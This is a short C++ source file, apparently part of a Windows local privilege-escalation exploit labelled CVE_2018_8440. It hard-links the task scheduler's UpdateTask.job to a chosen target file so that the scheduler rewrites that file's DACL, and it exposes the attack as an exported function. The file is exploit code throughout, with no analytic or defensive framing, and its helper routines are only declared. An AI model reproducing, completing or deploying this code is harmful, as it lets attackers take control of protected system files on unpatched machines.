#include <Windows.h>
#include <stdio.h>

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
void RunExploit();

extern "C"
{
	wchar_t* GetTargetPathW(wchar_t* const destination);
}

void WriteDacl(wchar_t* outfilepath)
{
	//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
	CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", outfilepath);
	RunExploit();
}

extern "C"
{
	void CVE_2018_8440(void)
	{
		wchar_t target_path[1024];
		GetTargetPathW(target_path);
		WriteDacl(target_path);
	}
}
